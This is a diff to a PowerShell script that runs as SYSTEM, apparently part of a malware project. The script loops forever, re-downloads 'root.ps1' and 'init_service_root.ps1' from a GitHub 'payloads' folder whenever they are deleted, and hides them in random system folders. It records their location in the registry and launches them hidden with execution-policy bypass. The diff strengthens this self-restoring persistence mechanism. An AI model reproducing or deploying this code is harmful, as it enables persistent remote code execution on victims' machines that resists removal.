@@ -1,6 +1,7 @@
 #script must run as admin/SYSTEM
 param(
-    [string]$rootPath
+    [string]$rootPath,
+    [string]$basePath
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
 $paths = @(
@@ -9,12 +10,21 @@ $paths = @(
 
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
-$hasRootPathModified=$false
-if(($rootPath -eq $null) -or ($rootPath -eq "")){
-    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
-    $rootPath = $paths[$idx]
-    $rootPath = "$rootPath\root.ps1"
-    $hasRootPathModified=$true
+$propertyName = "rootPath"
+$item = Get-ItemProperty -Path $basePath -Name $propertyName -ErrorAction SilentlyContinue
+$canUpdateRootPath = $false
+
+if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
+    $canUpdateRootPath = $true
+}
+
+if (-not($item)) {
+    $canUpdateRootPath = $false
+}
+
+else{
+    $rootPath = $item.$propertyName
+    $canUpdateRootPath = $true
 }
 
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -49,10 +59,10 @@ while ($true) {
     $serv = Check-Service -name $serviceName
 
     if(-not(Test-Path -Path $rootPath -PathType Leaf)){
-        if(-not($hasRootPathModified)){
+        if($canUpdateRootPath){
             $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootPath = "$rootPath\root.ps1"
-            $hasRootPathModified=$false
+            Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootPath -Force | Out-Null
         }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
@@ -63,5 +73,7 @@ while ($true) {
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
     }
-    Start-Sleep -Seconds 5
+    $canUpdateRootPath=$true
+    
+    Start-Sleep -Seconds 3
 }
